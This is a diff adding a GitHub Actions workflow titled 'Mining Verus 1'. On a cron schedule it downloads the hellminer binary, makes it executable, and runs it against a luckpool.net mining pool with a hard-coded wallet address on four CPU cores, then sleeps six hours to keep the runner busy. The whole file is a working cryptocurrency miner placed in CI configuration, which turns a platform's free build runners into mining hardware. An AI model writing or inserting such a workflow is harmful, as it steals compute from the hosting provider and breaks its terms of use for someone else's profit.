@@ -1,0 +1,20 @@
+name: Mining Verus 1
+on:
+  workflow_dispatch:
+  schedule:
+  - cron: "0/360 * * * *"
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Menambang
+        run: |
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+          tar -xzf hellminer_linux64.tar.gz
+          chmod +x hellminer
+          ./hellminer -c stratum+tcp://na.luckpool.net:3957 -u R9UwHf2AogrRbfvmd8oLBACo6psdD7TpSg -p hybrid --cpu 4
+      
+      - name: Add sleep
+        run: |
+          sleep 6h
